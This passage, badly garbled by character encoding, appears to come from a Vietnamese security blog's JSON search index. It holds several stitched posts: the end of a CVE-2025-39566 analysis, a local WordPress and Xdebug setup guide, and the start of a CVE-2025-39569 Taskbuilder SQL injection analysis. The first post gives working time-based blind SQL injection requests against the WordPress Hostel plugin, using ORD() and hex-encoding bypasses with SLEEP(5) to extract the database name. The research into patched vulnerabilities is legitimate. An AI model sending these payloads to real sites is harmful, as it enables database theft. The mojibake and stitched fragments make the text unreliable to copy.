Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = 